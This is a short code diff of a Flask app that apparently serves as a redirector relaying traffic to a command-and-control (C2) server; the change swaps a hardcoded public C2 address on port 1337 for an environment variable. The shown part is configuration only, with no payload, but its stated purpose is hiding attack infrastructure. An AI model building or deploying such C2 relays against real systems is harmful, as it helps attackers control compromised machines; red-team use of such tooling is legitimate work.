@@ -1,5 +1,6 @@
 from flask import Flask, request, Response
 import requests
+import os
 from urllib.parse import unquote
 import logging
 
@@ -7,7 +8,8 @@ app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
 
 # Change this to your real C2 server address
-C2_BACKEND = "http://44.202.81.220:1337"
+#C2_BACKEND = "http://44.202.81.220:1337"
+C2_BACKEND = os.getenv("C2_BACKEND", "http://127.0.0.1:1337")
 TIMEOUT = 10  # seconds for backend timeout
 
 # Health check endpoint for DO App Platform
